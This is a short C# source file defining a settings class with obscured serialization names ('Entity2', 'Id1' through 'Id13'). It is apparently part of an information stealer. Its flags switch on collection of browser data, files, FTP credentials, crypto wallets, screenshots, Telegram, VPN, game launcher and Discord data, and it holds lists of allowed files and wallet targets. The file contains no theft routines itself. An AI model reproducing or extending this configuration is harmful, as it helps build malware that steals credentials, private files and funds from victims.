using System;
using System.Collections.Generic;
using System.Runtime.Serialization;


[DataContract(Name = "Entity2", Namespace = "Entity")]
public class Entity_Settings
{
	[DataMember(Name = "Id1")]
	public bool CollectBrowsers { get; set; }

	[DataMember(Name = "Id2")]
	public bool GrabFiles { get; set; }

	[DataMember(Name = "Id3")]
	public bool CollectFTP { get; set; }

	[DataMember(Name = "Id4")]
	public bool CollectWallets { get; set; }

	[DataMember(Name = "Id5")]
	public bool CollectScreenshot { get; set; }

	[DataMember(Name = "Id6")]
	public bool CollectTelegram { get; set; }

	[DataMember(Name = "Id7")]
	public bool CollectVPN { get; set; }

	[DataMember(Name = "Id8")]
	public bool CollectGameLaunchers { get; set; }

	[DataMember(Name = "Id9")]
	public bool CollectDiscord { get; set; }

	[DataMember(Name = "Id10")]
	public List<string> AllowedFiles { get; set; }

	[DataMember(Name = "Id11")]
	public List<string> Id11 { get; set; }

	[DataMember(Name = "Id12")]
	public List<string> Id12 { get; set; }

	[DataMember(Name = "Id13")]
	public List<Entity_CryptoWallet> Id13 { get; set; }
}
